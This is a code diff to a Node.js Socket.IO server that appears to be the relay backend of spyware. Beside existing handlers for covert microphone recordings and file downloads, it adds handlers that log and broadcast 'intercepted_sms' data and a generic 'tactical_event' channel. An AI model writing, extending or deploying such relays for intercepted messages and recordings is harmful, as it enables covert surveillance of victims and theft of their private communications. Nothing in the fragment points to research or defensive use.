@@ -121,6 +121,11 @@ io.on('connection', (socket) => {
   });
 
   // Advanced features relay
+  socket.on('intercepted_sms', (data) => {
+    console.log(`SMS Intercepted: ${data.address} (${data.id})`);
+    io.emit('intercepted_sms', data);
+  });
+
   socket.on('mic_result', (data) => {
     console.log(`Audio recording received: ${data.filename} (${data.id})`);
     io.emit('mic_result', data);
@@ -137,6 +142,12 @@ io.on('connection', (socket) => {
   // Original image download relay
   socket.on('download_result', (data) => {
     io.emit('download_result', data);
+  });
+
+  // Generic Tactical Relay for future expansion
+  socket.on('tactical_event', (data) => {
+    console.log(`Tactical Event: ${data.type} from ${data.id}`);
+    io.emit('tactical_event', data);
   });
 
   socket.on('disconnect', () => {
